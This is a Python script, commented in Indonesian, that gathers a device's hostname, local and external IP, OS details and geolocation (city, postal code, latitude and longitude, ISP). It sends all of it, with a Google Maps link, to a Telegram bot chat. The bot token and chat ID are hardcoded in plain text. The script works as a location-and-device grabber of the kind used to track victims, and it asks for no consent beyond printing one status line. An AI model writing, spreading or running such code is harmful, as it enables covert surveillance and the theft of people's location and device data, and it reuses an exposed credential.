import requests
import socket
import platform
import uuid
import re
import json

# Konfigurasi Bot Telegram
BOT_TOKEN = "8115407226:AAEOHx-HOK_1GyMhL4lxVpyP_qncyzmbeGw"
CHAT_ID = "-4734661201"  # Isi dengan chat ID Anda (biarkan kosong untuk dicari otomatis)

def get_device_info():
    """Mengumpulkan informasi perangkat dan lokasi"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # Mencari alamat IP eksternal dan lokasi
        try:
            external_ip = requests.get('https://api.ipify.org').text
            geo_data = requests.get(f'http://ip-api.com/json/{external_ip}').json()
            
            location_info = {
                "IP Eksternal": external_ip,
                "Negara": geo_data.get('country', 'Tidak diketahui'),
                "Kode Negara": geo_data.get('countryCode', 'Tidak diketahui'),
                "Region": geo_data.get('regionName', 'Tidak diketahui'),
                "Kota": geo_data.get('city', 'Tidak diketahui'),
                "Kode Pos": geo_data.get('zip', 'Tidak diketahui'),
                "Latitude": geo_data.get('lat', 'Tidak diketahui'),
                "Longitude": geo_data.get('lon', 'Tidak diketahui'),
                "Zona Waktu": geo_data.get('timezone', 'Tidak diketahui'),
                "ISP": geo_data.get('isp', 'Tidak diketahui'),
                "Organisasi": geo_data.get('org', 'Tidak diketahui'),
                "AS": geo_data.get('as', 'Tidak diketahui')
            }
        except Exception as geo_error:
            print(f"Error mendapatkan lokasi: {geo_error}")
            location_info = {
                "IP Eksternal": "Tidak dapat diperoleh",
                "Lokasi": "Gagal mendapatkan data lokasi"
            }
        
        info = {
            "Sistem Operasi": platform.system(),
            "Nama Perangkat": hostname,
            "Arsitektur": platform.machine(),
            "Processor": platform.processor(),
            "Versi OS": platform.version(),
            "IP Lokal": ip_address,
            "Platform": platform.platform(),
            "Python Version": platform.python_version(),
            **location_info
        }
        
        # Tambahkan link Google Maps jika koordinat tersedia
        if 'Latitude' in info and 'Longitude' in info and info['Latitude'] != 'Tidak diketahui':
            info["Peta Google"] = f"https://www.google.com/maps?q={info['Latitude']},{info['Longitude']}"
        
        return info
    except Exception as e:
        return {"Error": f"Gagal mengumpulkan info perangkat: {str(e)}"}

def get_chat_id():
    """Mendapatkan chat ID terbaru dari bot"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        response = requests.get(url)
        data = response.json()
        
        if data["ok"] and data["result"]:
            return data["result"][-1]["message"]["chat"]["id"]
        return None
    except Exception as e:
        print(f"Error getting chat ID: {e}")
        return None

def send_to_telegram(message):
    """Mengirim pesan ke bot Telegram"""
    global CHAT_ID
    
    if not CHAT_ID:
        CHAT_ID = get_chat_id()
        if not CHAT_ID:
            return "Error: Tidak dapat menemukan chat ID. Kirim pesan ke bot terlebih dahulu."
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return "Data berhasil dikirim ke Telegram!"
        else:
            return f"Error: Gagal mengirim data. Status code: {response.status_code}"
    except Exception as e:
        return f"Error: Gagal mengirim data. {str(e)}"

def main():
    # Mengumpulkan informasi perangkat
    device_info = get_device_info()
    
    # Format pesan untuk Telegram
    message = "<b>📊 Informasi Perangkat dan Lokasi</b>\n\n"
    for key, value in device_info.items():
        message += f"<b>{key}:</b> {value}\n"
    
    # Mengirim ke Telegram
    result = send_to_telegram(message)
    print(result)

if __name__ == "__main__":
    print("Mengumpulkan informasi perangkat dan lokasi, mengirim ke Telegram...")
    main()
